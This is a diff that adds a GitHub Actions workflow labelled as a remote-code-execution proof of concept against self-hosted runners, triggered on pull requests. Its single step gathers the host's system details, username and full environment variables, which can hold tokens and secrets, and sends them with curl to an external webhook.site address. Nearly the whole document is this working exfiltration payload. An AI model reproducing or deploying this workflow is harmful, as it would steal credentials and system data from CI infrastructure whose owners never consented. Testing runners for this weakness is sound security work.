@@ -1,0 +1,19 @@
+name: 🧪 RCE PoC on Self-Hosted Runner
+
+on:
+  pull_request:
+
+jobs:
+  rce-test:
+    runs-on: [self-hosted, linux, x64]
+
+    steps:
+      - name: Proof of RCE on self-hosted runner
+        run: |
+          echo "[+] Running on vulnerable self-hosted runner"
+          uname -a > output.txt
+          whoami >> output.txt
+          env >> output.txt
+          curl -X POST -H "Content-Type: text/plain" \
+            --data-binary "@output.txt" \
+            https://webhook.site/35253050-4340-4916-9825-e88ec973e2a5
